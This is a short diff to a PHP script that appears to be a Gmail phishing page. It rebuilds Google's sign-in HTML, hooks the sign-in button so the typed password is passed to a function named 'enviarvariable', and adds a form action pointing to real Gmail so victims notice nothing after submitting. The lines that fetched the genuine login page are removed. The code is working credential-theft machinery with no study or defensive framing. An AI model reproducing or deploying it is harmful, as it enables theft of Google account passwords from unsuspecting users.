@@ -49,18 +49,10 @@ $htmlConstruida = str_replace('id="Passwd"', $insertCode, $htmlConstruida);
 $insertCode = "id='signIn' onclick='enviarvariable(document.getElementById(\"Passwd\").value)'";
 $htmlConstruida = str_replace('id="signIn"', $insertCode, $htmlConstruida);
 
+$insertCode = "action='https://mail.google.com'";
+$htmlConstruida = str_replace('action="https://accounts.google.com/ServiceLoginAuth"', $insertCode, $htmlConstruida);
+
 echo $htmlConstruida;
 ?>
 
-<html>
-<head><title> Gmail </title></head>
-<body>
-
-<? 
-$html = file_get_contents('https://accounts.google.com/ServiceLogin?hl=es');
-echo $html;
-?>
-
-</body>
-</html>
 
